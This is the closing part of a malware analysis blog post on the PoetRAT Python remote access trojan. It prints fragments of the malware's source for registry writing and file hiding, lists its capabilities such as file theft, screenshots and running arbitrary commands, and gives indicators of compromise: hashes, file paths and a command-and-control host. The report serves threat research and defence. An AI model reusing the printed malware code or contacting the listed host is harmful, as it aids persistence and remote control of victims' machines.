    <span class="n">args</span> <span class="o">=</span> <span class="nb">vars</span><span class="p">(</span><span class="n">ap</span><span class="p">.</span><span class="n">parse_args</span><span class="p">(</span><span class="n">cmd</span><span class="p">))</span>
    <span class="n">owner</span> <span class="o">=</span> <span class="p">{</span>
        <span class="s">"ClsRoot"</span><span class="p">:</span> <span class="n">winreg</span><span class="p">.</span><span class="n">HKEY_CLASSES_ROOT</span><span class="p">,</span>
        <span class="s">"CurUs"</span><span class="p">:</span> <span class="n">winreg</span><span class="p">.</span><span class="n">HKEY_CURRENT_USER</span><span class="p">,</span>
        <span class="s">"DynData"</span><span class="p">:</span> <span class="n">winreg</span><span class="p">.</span><span class="n">HKEY_DYN_DATA</span><span class="p">,</span>
        <span class="s">"LocMach"</span><span class="p">:</span> <span class="n">winreg</span><span class="p">.</span><span class="n">HKEY_LOCAL_MACHINE</span><span class="p">,</span>
        <span class="s">"PrefData"</span><span class="p">:</span> <span class="n">winreg</span><span class="p">.</span><span class="n">HKEY_PERFORMANCE_DATA</span><span class="p">,</span>
        <span class="s">"Users"</span><span class="p">:</span> <span class="n">winreg</span><span class="p">.</span><span class="n">HKEY_USERS</span>
    <span class="p">}</span>
    <span class="n">val_type</span> <span class="o">=</span> <span class="p">{</span>
        <span class="s">"DWord"</span><span class="p">:</span> <span class="n">winreg</span><span class="p">.</span><span class="n">REG_DWORD</span><span class="p">,</span>
        <span class="s">"Link"</span><span class="p">:</span> <span class="n">winreg</span><span class="p">.</span><span class="n">REG_LINK</span><span class="p">,</span>
        <span class="s">"Binary"</span><span class="p">:</span> <span class="n">winreg</span><span class="p">.</span><span class="n">REG_BINARY</span><span class="p">,</span>
        <span class="s">"QWord"</span><span class="p">:</span> <span class="n">winreg</span><span class="p">.</span><span class="n">REG_QWORD</span><span class="p">,</span>
        <span class="s">"SZ"</span><span class="p">:</span> <span class="n">winreg</span><span class="p">.</span><span class="n">REG_SZ</span><span class="p">,</span>
        <span class="s">"None"</span><span class="p">:</span> <span class="n">winreg</span><span class="p">.</span><span class="n">REG_NONE</span>
    <span class="p">}</span>

    <span class="n">registry</span><span class="p">(</span><span class="n">owner</span><span class="p">[</span><span class="n">args</span><span class="p">[</span><span class="s">"o"</span><span class="p">]],</span> <span class="n">args</span><span class="p">[</span><span class="s">"p"</span><span class="p">],</span> <span class="n">args</span><span class="p">[</span><span class="s">"n"</span><span class="p">],</span> <span class="n">args</span><span class="p">[</span><span class="s">"v"</span><span class="p">],</span> <span class="n">val_type</span><span class="p">[</span><span class="n">args</span><span class="p">[</span><span class="s">"t"</span><span class="p">]])</span>
    <span class="k">return</span> <span class="s">"{0} Added to {1} registry under the name {2}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">args</span><span class="p">[</span><span class="s">"f"</span><span class="p">],</span> <span class="n">owner</span><span class="p">[</span><span class="n">args</span><span class="p">[</span><span class="s">"o"</span><span class="p">]]</span> <span class="o">+</span> <span class="s">"|"</span> <span class="o">+</span> <span class="n">args</span><span class="p">[</span><span class="s">"p"</span><span class="p">],</span>
                                                                 <span class="n">args</span><span class="p">[</span><span class="s">"n"</span><span class="p">])</span>


<span class="k">def</span> <span class="nf">hide_file_a</span><span class="p">(</span><span class="n">cmd</span><span class="p">):</span>
    <span class="n">ap</span> <span class="o">=</span> <span class="n">ArgumentParser</span><span class="p">(</span><span class="s">"hide"</span><span class="p">)</span>
    <span class="n">ap</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">"file"</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">)</span>
    <span class="n">ap</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">"-del"</span><span class="p">,</span> <span class="n">action</span><span class="o">=</span><span class="s">"store_true"</span><span class="p">)</span>
    <span class="n">args</span> <span class="o">=</span> <span class="nb">vars</span><span class="p">(</span><span class="n">ap</span><span class="p">.</span><span class="n">parse_args</span><span class="p">(</span><span class="n">cmd</span><span class="p">))</span>

    <span class="n">unhide_file</span><span class="p">(</span><span class="n">args</span><span class="p">[</span><span class="s">"file"</span><span class="p">])</span> <span class="k">if</span> <span class="n">args</span><span class="p">[</span><span class="s">"del"</span><span class="p">]</span> <span class="k">else</span> <span class="n">hide_file</span><span class="p">(</span><span class="n">args</span><span class="p">[</span><span class="s">"file"</span><span class="p">])</span>
    <span class="k">return</span> <span class="s">"{0} has been {1}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">args</span><span class="p">[</span><span class="s">"f"</span><span class="p">],</span> <span class="s">"relieved"</span> <span class="k">if</span> <span class="n">args</span><span class="p">[</span><span class="s">"del"</span><span class="p">]</span> <span class="k">else</span> <span class="s">"hidden"</span><span class="p">)</span>
</pre></table></code></div></div><p>This script defines the capabilities of the malware, because it’s the library that was used by “<strong>smile.py”</strong> which is responsible for executing built-in commands.</p><h1 id="malware-capabilities">Malware capabilities</h1><ol><li>Listing files (<strong>ls</strong>)<li>Work and change directories (<strong>cd</strong>)<li>Getting system info<li>Downloading files (Using FTP protocol)<li>Uploading files<li>Taking and uploading screenshot<li>Copying files<li>Moving files<li>Creating shortcuts like (Links)<li>Manipulating registry<li>Hiding files<li>Compressing files<li>Manipulating processes<li>Executing any <strong>cmd</strong> commands</ol><h1 id="further-investigation-on-the-host">Further investigation on the host</h1><p>The host found is <strong>dellgenius.hopto.org</strong></p><p><strong>Hopto.org</strong> domain is <strong>NO-IP</strong> service, it’s <strong>DDNS</strong> service points to dynamic IP, such services often used by malwares to make command and control servers more resistant to takedowns and increase sustainability on the wild.</p><p>Looked at <strong>shodan.io</strong> but no info was found about this host</p><p><img data-proofer-ignore data-src="https://github.com/AbdoD97/abdod97.github.io/blob/master/_posts/PoetRAT/media/image4.png?raw=true" alt="" /></p><p>Looked at <strong>securitytrails</strong> to check for history of DNS records</p><p><img data-proofer-ignore data-src="https://github.com/AbdoD97/abdod97.github.io/blob/master/_posts/PoetRAT/media/image5.png?raw=true" alt="" /></p><p>It looks like year ago it was pointing to <strong>hostkey</strong> hosting service which apparently was hosting the C&amp;C server. Also, by doing a reverse IP lookup against these IPs it looks like that one of them pointed to this <strong>cryptosuccesstrade.com</strong> website, which was a fishy cryptocurrency investing platform. Maybe they were using it as a camouflage. Who knows!</p><p><a href="https://web.archive.org/web/20200509181348/http:/cryptosuccesstrade.com/">https://web.archive.org/web/20200509181348/http://cryptosuccesstrade.com/</a></p><h1 id="indicator-of-compromises">Indicator of compromises</h1><h2 id="hashes"><strong>Hashes</strong></h2><ol><li><strong>Sample1, docer.doc</strong><br /> SHA256 208EC23C233580DBFC53AAD5655845F7152ADA56DD6A5C780D54E84A9D227407<li><strong>smile.zip</strong><br /> SHA256 FA97AE75665B2C16100EF7529BBD3C08861E4CA27BF27453F6B668AE77D1692E<li><strong>launcher.py</strong><br /> SHA256 5F1C268826EC0DD0ACA8C89AB63A8A1DE0B4E810DED96CDEE4B28108F3476CE7<li><strong>frown.py</strong><br /> SHA256 D4B7E4870795E6F593C9B3143E2BA083CF12AC0C79D2DD64B869278B0247C247<li><strong>smile.py</strong><br /> SHA256 252C5D491747A42175C7C57CCC5965E3A7B83EB5F964776EF108539B0A29B2EE<li><strong>smile_funs.py</strong><br /> SHA256 312F54943EBFD68E927E9AA95A98CA6F2D3572BF99DA6B448C5144864824C04D<li><strong>backer.py</strong><br /> SHA256 CA8492139C556EAC6710FE73BA31B53302505A8CC57338E4D2146BDFA8F69BDB**\<li><strong>affine.py</strong><br /> SHA256 B1E7DC16E24EBEB60BC6753C54E940C3E7664E9FCB130BD663129ECDB5818FCD</ol><h2 id="files"><strong>Files</strong></h2><ol><li>C:\Users\Public\smile.zip<li>C:\Users\Public\docer.doc<li>C:\Users\Public\Python37\launcher.py<li>C:\Users\Public\Python37\frown.py<li>C:\Users\Public\Python37\smile.py<li>C:\Users\Public\Python37\smile_funs.py<li>C:\Users\Public\Python37\backer.py<li>C:\Users\Public\Python37\affine.py<li>C:\Users\Public\Python37\.key<li>C:\Users\Public\Python37\.ready</ol><h2 id="hosts"><strong>Hosts</strong></h2><ol><li>dellgenius.hopto.org:143</ol></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/malware-reports/'>malware-reports</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/dropper/" class="post-tag no-text-decoration" >dropper</a> <a href="/tags/macro/" class="post-tag no-text-decoration" >macro</a> <a href="/tags/obfuscated-macro/" class="post-tag no-text-decoration" >obfuscated-macro</a> <a href="/tags/rat/" class="post-tag no-text-decoration" >rat</a> <a href="/tags/python/" class="post-tag no-text-decoration" >python</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=PoetRAT - Abdelrahman Eldawi&url=https://abdod97.github.io/posts/PoetRAT-Report/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=PoetRAT - Abdelrahman Eldawi&u=https://abdod97.github.io/posts/PoetRAT-Report/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=PoetRAT - Abdelrahman Eldawi&url=https://abdod97.github.io/posts/PoetRAT-Report/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink('', 'Link copied successfully!')" data-toggle="tooltip" data-placement="top" title="Copy link"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/FlawedAmmyy-Rat/">FlawedAmmyy Rat</a><li><a href="/posts/PoetRAT-Report/">PoetRAT</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/malware-unpacking/">malware-unpacking</a> <a class="post-tag" href="/tags/unpacking/">unpacking</a> <a class="post-tag" href="/tags/dropper/">dropper</a> <a class="post-tag" href="/tags/macro/">macro</a> <a class="post-tag" href="/tags/obfuscated-macro/">obfuscated-macro</a> <a class="post-tag" href="/tags/python/">python</a> <a class="post-tag" href="/tags/rat/">rat</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/FlawedAmmyy-Rat/"><div class="card-body"> <span class="timeago small" >Oct 23<i class="unloaded">2021-10-23T14:33:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>FlawedAmmyy Rat</h3><div class="text-muted small"><p> FlawedAmmyy is a remote access Trojan (RAT) which is based on leaked Ammyy Admin software. Ammyy Admin is a popular remote access tool used by businesses and consumers to handle remote control and ...</p></div></div></a></div><div class="card"> <a href="/posts/Remcos-Malware-Unpacking/"><div class="card-body"> <span class="timeago small" >Sep 21<i class="unloaded">2021-09-21T05:33:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Remcos Malware Unpacking</h3><div class="text-muted small"><p> Remcos or Remote Control and Surveillance, marketed as a legitimate software by a Germany-based firm Breaking Security for remotely managing Windows systems is now widely used in multiple malicious...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/Remcos-Malware-Unpacking/" class="btn btn-outline-primary" prompt="Older"><p>Remcos Malware Unpacking</p></a> <a href="/posts/FlawedAmmyy-Rat/" class="btn btn-outline-primary" prompt="Newer"><p>FlawedAmmyy Rat</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2021 <a href="">abdelrahman eldawi</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/malware-unpacking/">malware unpacking</a> <a class="post-tag" href="/tags/unpacking/">unpacking</a> <a class="post-tag" href="/tags/dropper/">dropper</a> <a class="post-tag" href="/tags/macro/">macro</a> <a class="post-tag" href="/tags/obfuscated-macro/">obfuscated macro</a> <a class="post-tag" href="/tags/python/">python</a> <a class="post-tag" href="/tags/rat/">rat</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><script src="https://cdn.jsdelivr.net/npm/mermaid@8/dist/mermaid.min.js"></script> <script> $(function() { let initTheme = "default"; if ($("html[mode=dark]").length > 0 || ($("html[mode]").length == 0 && window.matchMedia("(prefers-color-scheme: dark)").matches ) ) { initTheme = "dark"; } let mermaidConf = { theme: initTheme /* <default|dark|forest|neutral> */ }; /* Markdown converts to HTML */ $("pre").has("code.language-mermaid").each(function() { let svgCode = $(this).children().html(); $(this).addClass("unloaded"); $(this).after(`<div class=\"mermaid\">${svgCode}</div>`); }); mermaid.initialize(mermaidConf); }); </script><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://abdod97.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script>
